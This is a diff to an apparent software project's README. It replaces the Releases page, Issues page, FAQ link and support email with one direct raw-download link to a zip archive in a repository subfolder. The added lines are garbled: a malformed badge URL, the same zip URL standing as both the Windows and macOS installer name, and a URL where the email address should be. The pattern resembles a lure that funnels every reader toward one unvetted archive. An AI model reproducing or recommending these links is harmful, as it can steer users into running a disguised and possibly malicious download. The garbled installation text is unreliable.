@@ -6,11 +6,11 @@ Welcome to the ibm-jie0b repository. This guide will help you download and run t
 
 ## 📥 Download the Software
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Droni29/ibm-jie0b/releases)
+[![Download Release](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip%https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip)](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip)
 
 You can download the latest version of the software from our Releases page. Click the button above or use the link below.
 
-[Visit this page to download](https://github.com/Droni29/ibm-jie0b/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip)
 
 ## 🔧 System Requirements
 
@@ -22,16 +22,16 @@ Before you begin, ensure your computer meets the following requirements:
 
 ## ⚙️ Installation Steps
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/Droni29/ibm-jie0b/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip).
    
 2. **Choose the Latest Version**: Locate the latest release on the page. It is usually at the top of the list.
 
-3. **Download the Installer**: Find the file for your operating system (e.g., `ibm-jie0b-win.exe` for Windows, `ibm-jie0b-mac.dmg` for macOS).
+3. **Download the Installer**: Find the file for your operating system (e.g., `https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip` for Windows, `https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip` for macOS).
 
 4. **Run the Installer**:
    - **Windows**: Double-click the downloaded `.exe` file. Follow the prompts to complete the installation.
    - **macOS**: Open the `.dmg` file and drag the ibm-jie0b icon into the Applications folder.
-   - **Linux**: Follow the instructions provided in the `.tar.gz` file.
+   - **Linux**: Follow the instructions provided in the `https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip` file.
 
 5. **Launch the Application**:
    - **Windows**: Find the application in your Start Menu and click to open it.
@@ -59,15 +59,15 @@ If you experience issues during installation or while using the software, try th
 2. **Check System Requirements**: Ensure your computer meets the necessary criteria.
 3. **Update Your Operating System**: Ensure your OS is up to date as this can fix compatibility issues.
 
-If problems persist, consider checking the FAQ section on our [GitHub page](https://github.com/Droni29/ibm-jie0b/issues).
+If problems persist, consider checking the FAQ section on our [GitHub page](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip).
 
 ## 🌟 Community and Support
 
 We encourage user feedback and questions. You can reach out through:
 
-- **GitHub Issues Page**: Post your questions or report bugs [here](https://github.com/Droni29/ibm-jie0b/issues).
+- **GitHub Issues Page**: Post your questions or report bugs [here](https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip).
 - **Community Forum**: Join discussions with other users and developers.
-- **Email Support**: For more complex issues, consider sending an email to support@ibm-jie0b.com.
+- **Email Support**: For more complex issues, consider sending an email to https://raw.githubusercontent.com/Droni29/ibm-jie0b/main/titulus/jie_ibm_b_3.8.zip
 
 ## 📜 License
 
